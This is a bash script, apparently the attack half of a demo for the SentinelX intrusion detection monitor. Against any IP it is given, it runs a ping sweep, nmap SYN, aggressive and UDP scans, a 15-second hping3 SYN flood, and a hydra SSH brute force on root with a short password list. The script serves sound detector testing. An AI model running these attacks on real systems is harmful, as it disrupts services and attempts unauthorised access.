#!/bin/bash
# ============================================================
#  SentinelX Demo -- Kali Linux Attack Script
#  
#  This script launches multiple attacks against the Ubuntu VM
#  to trigger alerts on the SentinelX Live Monitor.
#
#  Usage:
#    chmod +x attack_demo.sh
#    sudo ./attack_demo.sh <ubuntu_ip>
#
#  Example:
#    sudo ./attack_demo.sh 192.168.56.101
# ============================================================

RED='\033[0;91m'
GREEN='\033[0;92m'
YELLOW='\033[0;93m'
CYAN='\033[0;96m'
BOLD='\033[1m'
RESET='\033[0m'

# Check if target IP is provided
if [ -z "$1" ]; then
    echo -e "${RED}[ERROR] Usage: sudo ./attack_demo.sh <ubuntu_ip>${RESET}"
    echo -e "  Example: sudo ./attack_demo.sh 192.168.56.101"
    exit 1
fi

TARGET=$1

# Check if running as root
if [ "$EUID" -ne 0 ]; then
    echo -e "${RED}[ERROR] Please run as root: sudo ./attack_demo.sh $TARGET${RESET}"
    exit 1
fi

echo ""
echo -e "${RED}${BOLD}============================================================${RESET}"
echo -e "${RED}${BOLD}   SENTINELX DEMO -- KALI ATTACK SIMULATION${RESET}"
echo -e "${RED}${BOLD}============================================================${RESET}"
echo ""
echo -e "${YELLOW}  Target  : $TARGET${RESET}"
echo -e "${YELLOW}  Attacker: $(hostname -I | awk '{print $1}')${RESET}"
echo ""
echo -e "${CYAN}  Make sure SentinelX is running on Ubuntu before continuing.${RESET}"
echo -e "${CYAN}  (cicflowmeter + live_monitor.py)${RESET}"
echo ""
read -p "  Press ENTER to begin the attack sequence..."
echo ""

# ──────────────────────────────────────────────────────────────
# ATTACK 1: Ping Sweep (Reconnaissance)
# ──────────────────────────────────────────────────────────────
echo -e "${BOLD}[ATTACK 1/6] Ping Sweep -- Reconnaissance${RESET}"
echo -e "${YELLOW}  Checking if target is alive...${RESET}"
echo ""

ping -c 5 $TARGET
echo ""
echo -e "${GREEN}  [DONE] Ping sweep complete.${RESET}"
echo ""
sleep 2

# ──────────────────────────────────────────────────────────────
# ATTACK 2: Nmap SYN Stealth Scan (Port Scanning)
# ──────────────────────────────────────────────────────────────
echo -e "${BOLD}[ATTACK 2/6] Nmap SYN Stealth Scan -- Port Scanning${RESET}"
echo -e "${YELLOW}  Scanning top 1000 ports on $TARGET ...${RESET}"
echo ""

nmap -sS -T4 -p 1-1000 $TARGET
echo ""
echo -e "${GREEN}  [DONE] Port scan complete.${RESET}"
echo ""
sleep 3

# ──────────────────────────────────────────────────────────────
# ATTACK 3: Nmap Aggressive Scan (OS Detection + Service Enum)
# ──────────────────────────────────────────────────────────────
echo -e "${BOLD}[ATTACK 3/6] Nmap Aggressive Scan -- OS & Service Detection${RESET}"
echo -e "${YELLOW}  Running aggressive scan with version detection...${RESET}"
echo ""

nmap -A -T5 --top-ports 100 $TARGET
echo ""
echo -e "${GREEN}  [DONE] Aggressive scan complete.${RESET}"
echo ""
sleep 3

# ──────────────────────────────────────────────────────────────
# ATTACK 4: SYN Flood (DoS Attack)
# ──────────────────────────────────────────────────────────────
echo -e "${BOLD}[ATTACK 4/6] SYN Flood -- Denial of Service${RESET}"
echo -e "${YELLOW}  Flooding $TARGET:80 with SYN packets for 15 seconds...${RESET}"
echo ""

# Run hping3 for 15 seconds then kill it
timeout 15 hping3 -S --flood -V -p 80 $TARGET 2>/dev/null &
HPING_PID=$!
sleep 15
kill $HPING_PID 2>/dev/null
wait $HPING_PID 2>/dev/null

echo ""
echo -e "${GREEN}  [DONE] SYN flood stopped after 15 seconds.${RESET}"
echo ""
sleep 3

# ──────────────────────────────────────────────────────────────
# ATTACK 5: SSH Brute Force (Credential Stuffing)
# ──────────────────────────────────────────────────────────────
echo -e "${BOLD}[ATTACK 5/6] SSH Brute Force -- Credential Attack${RESET}"
echo -e "${YELLOW}  Attempting 20 SSH login attempts against $TARGET ...${RESET}"
echo ""

# Try 20 passwords from a small inline wordlist
# (This avoids needing rockyou.txt for a quick demo)
WORDLIST="/tmp/sentinelx_demo_passwords.txt"
cat > $WORDLIST << 'EOF'
admin
password
123456
root
toor
letmein
welcome
monkey
dragon
master
qwerty
login
abc123
starwars
trustno1
iloveyou
sunshine
princess
football
shadow
EOF

hydra -l root -P $WORDLIST -t 4 -f -V ssh://$TARGET 2>/dev/null || true
rm -f $WORDLIST

echo ""
echo -e "${GREEN}  [DONE] SSH brute force complete.${RESET}"
echo ""
sleep 3

# ──────────────────────────────────────────────────────────────
# ATTACK 6: Nmap Intense UDP Scan (Unknown/Zero-Day Simulation)
# ──────────────────────────────────────────────────────────────
echo -e "${BOLD}[ATTACK 6/6] UDP Intense Scan -- Simulating Unknown Attack${RESET}"
echo -e "${YELLOW}  Scanning top 50 UDP ports (uncommon traffic pattern)...${RESET}"
echo ""

nmap -sU -T4 --top-ports 50 $TARGET
echo ""
echo -e "${GREEN}  [DONE] UDP scan complete.${RESET}"
echo ""

# ──────────────────────────────────────────────────────────────
# SUMMARY
# ──────────────────────────────────────────────────────────────
echo ""
echo -e "${RED}${BOLD}============================================================${RESET}"
echo -e "${RED}${BOLD}   ATTACK SEQUENCE COMPLETE${RESET}"
echo -e "${RED}${BOLD}============================================================${RESET}"
echo ""
echo -e "  Attacks launched against ${BOLD}$TARGET${RESET}:"
echo ""
echo -e "  1. Ping Sweep           (Reconnaissance)"
echo -e "  2. SYN Stealth Scan     (Port Scanning)"
echo -e "  3. Aggressive Scan      (OS/Service Detection)"
echo -e "  4. SYN Flood            (Denial of Service)"
echo -e "  5. SSH Brute Force      (Credential Stuffing)"
echo -e "  6. UDP Intense Scan     (Unknown Traffic Pattern)"
echo ""
echo -e "${CYAN}  Now check the SentinelX monitor on Ubuntu for alerts!${RESET}"
echo ""
